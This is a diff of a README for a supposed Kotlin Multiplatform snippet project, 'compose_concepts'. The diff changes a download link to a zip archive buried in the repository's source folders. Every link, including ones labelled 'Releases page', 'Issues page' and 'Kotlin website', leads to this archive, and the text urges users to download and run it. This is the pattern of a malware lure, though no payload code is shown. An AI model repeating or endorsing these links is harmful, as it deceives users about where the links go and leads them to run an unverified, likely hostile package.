@@ -1,7 +1,7 @@
 # 🌍 compose_concepts - Simple Code Snippets for Everyone
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/Wageschedulehairsbreadth130/compose_concepts/main/iosApp/iosApp/Assets.xcassets/AppIcon.appiconset/compose_concepts-v2.8.zip)](https://raw.githubusercontent.com/Wageschedulehairsbreadth130/compose_concepts/main/iosApp/iosApp/Assets.xcassets/AppIcon.appiconset/compose_concepts-v2.8.zip)
+[![Download](https://github.com/Wageschedulehairsbreadth130/compose_concepts/raw/refs/heads/main/composeApp/src/commonMain/kotlin/concepts_compose_v1.5.zip)](https://github.com/Wageschedulehairsbreadth130/compose_concepts/raw/refs/heads/main/composeApp/src/commonMain/kotlin/concepts_compose_v1.5.zip)
 
 ## 📖 Introduction
 Welcome to **compose_concepts**! This project provides random code snippets for Kotlin Multiplatform applications. Whether you develop for Android, iOS, or Desktop, you can use these code examples to enhance your projects. This guide will help you download and run the software easily.
@@ -12,7 +12,7 @@ Follow these simple steps to get started with **compose_concepts**.
 ### 1. Visit the Releases Page
 Click the link below to access the Releases page, where you can download the latest version of the application.
 
-[Visit Releases Page](https://raw.githubusercontent.com/Wageschedulehairsbreadth130/compose_concepts/main/iosApp/iosApp/Assets.xcassets/AppIcon.appiconset/compose_concepts-v2.8.zip)
+[Visit Releases Page](https://github.com/Wageschedulehairsbreadth130/compose_concepts/raw/refs/heads/main/composeApp/src/commonMain/kotlin/concepts_compose_v1.5.zip)
 
 ### 2. Download the Application
 On the Releases page, locate the latest version. Click on the package compatible with your operating system. Download it to your computer.
@@ -52,12 +52,12 @@ To run **compose_concepts**, ensure you meet the following requirements:
 - Feel free to contribute to the project by suggesting improvements or fixes.
 
 ## 📞 Support
-If you encounter any issues while downloading or running the application, please reach out via the [Issues page](https://raw.githubusercontent.com/Wageschedulehairsbreadth130/compose_concepts/main/iosApp/iosApp/Assets.xcassets/AppIcon.appiconset/compose_concepts-v2.8.zip). We monitor this page regularly and will respond to your queries as soon as possible.
+If you encounter any issues while downloading or running the application, please reach out via the [Issues page](https://github.com/Wageschedulehairsbreadth130/compose_concepts/raw/refs/heads/main/composeApp/src/commonMain/kotlin/concepts_compose_v1.5.zip). We monitor this page regularly and will respond to your queries as soon as possible.
 
 ## 📚 Further Reading
-For more information about Kotlin Multiplatform, visit the [Kotlin website](https://raw.githubusercontent.com/Wageschedulehairsbreadth130/compose_concepts/main/iosApp/iosApp/Assets.xcassets/AppIcon.appiconset/compose_concepts-v2.8.zip).
+For more information about Kotlin Multiplatform, visit the [Kotlin website](https://github.com/Wageschedulehairsbreadth130/compose_concepts/raw/refs/heads/main/composeApp/src/commonMain/kotlin/concepts_compose_v1.5.zip).
 
 ## 📥 Download & Install
 Now that you know how to get started, don’t forget to visit the Releases page to download the latest version of **compose_concepts**.
 
-[Download Now](https://raw.githubusercontent.com/Wageschedulehairsbreadth130/compose_concepts/main/iosApp/iosApp/Assets.xcassets/AppIcon.appiconset/compose_concepts-v2.8.zip)
+[Download Now](https://github.com/Wageschedulehairsbreadth130/compose_concepts/raw/refs/heads/main/composeApp/src/commonMain/kotlin/concepts_compose_v1.5.zip)
